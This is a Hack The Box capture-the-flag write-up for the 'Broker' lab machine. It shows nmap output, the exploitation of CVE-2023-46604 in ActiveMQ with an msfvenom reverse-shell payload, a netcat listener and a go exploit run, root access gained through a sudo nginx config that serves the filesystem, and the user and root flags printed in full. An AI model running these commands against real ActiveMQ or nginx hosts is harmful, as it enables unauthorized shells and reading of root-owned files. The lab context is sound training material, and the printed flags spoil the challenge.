---
title: "Broker from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Broker from HTB
[page](https://app.hackthebox.com/machines/Broker)
`Nmap `gave this:
```bash
nmap -sCV --min-rate 4000 10.10.11.243 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 20:38 +04
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 88.89% done; ETC: 20:39 (0:00:02 remaining)
Nmap scan report for 10.10.11.243
Host is up (0.087s latency).
Not shown: 65520 closed tcp ports (conn-refused)
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open     http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
1883/tcp  open     mqtt
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     ActiveMQ/Advisory/Consumer/Topic/#:
|_    ActiveMQ/Advisory/MasterBroker:
5672/tcp  open     amqp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
7328/tcp  filtered swx
8161/tcp  open     http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
17431/tcp filtered unknown
35037/tcp open     tcpwrapped
47098/tcp filtered unknown
53708/tcp filtered unknown
54578/tcp filtered unknown
57832/tcp filtered unknown
61613/tcp open     stomp      Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open     http       Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
| http-methods:
|_  Potentially risky methods: TRACE
61616/tcp open     apachemq   ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.15
```
If you try to access the site with `IP`you can't because it needs password and username. If you try all the ports you will get nothing. There is one interesting port `61616`where `ApacheMQ 5.15.15`is running on. I went and searched for exploit and found this `Github`Repository: https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ, which can help me access the server with `NetCat`:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf
python3 -m http.server 8001 & # to run in background
nvim poc-linux.xml # Add your IP and PORT
nc -nlvp <port>
```
Get the connection by :
```go
go run main.go -i 10.10.11.243 -p 61616 -u http://<your_IP>:<PORT>/poc-linux.xml
```
use `script /dev/null -c bash`to activate the shell after connecting:
```bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt
8bda8fe33a8e63e0d6607091cd018d1b
```
***
User Flag: 8bda8fe33a8e63e0d6607091cd018d1b
***
Then learn what you can run with `root` permission:
```bash
sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
   env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
  use_pty

User activemq may run the following commands on broker:
   (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
We'll use this script for `nginx`privilege escalation:
```bash
cat nginx.conf
user root;
worker_processes auto;
pid /tmp/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http{

  server {
     listen 1337;
     location / {
         root /;
       }
 }
}
```
`Im too lazy to write more and i also don't have knowledge`
Then run this command with `nginx`. `Note that nginx will need absolute directory`
```bash
sudo nginx -c /dev/shm/nginx.conf
ss -tlpm
State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess
LISTEN 0      511          0.0.0.0:http        0.0.0.0:*
	 skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d10)
LISTEN 0      4096   127.0.0.53%lo:domain      0.0.0.0:*
	 skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d0)
LISTEN 0      128          0.0.0.0:ssh         0.0.0.0:*
	 skmem:(r0,rb131072,t0,tb16384,f0,w0,o0,bl0,d3)
LISTEN 0      511          0.0.0.0:1337        0.0.0.0:*
```
open `1337`port means that our script is working.
***
Then get the root flag with curl:
```bash
curl localhost:1337/root/root.txt
0e840a3e3a0cffc313db9d602283627c
```
***
![](/assets/images/Screenshot from 2024-08-07 22-10-05.png)
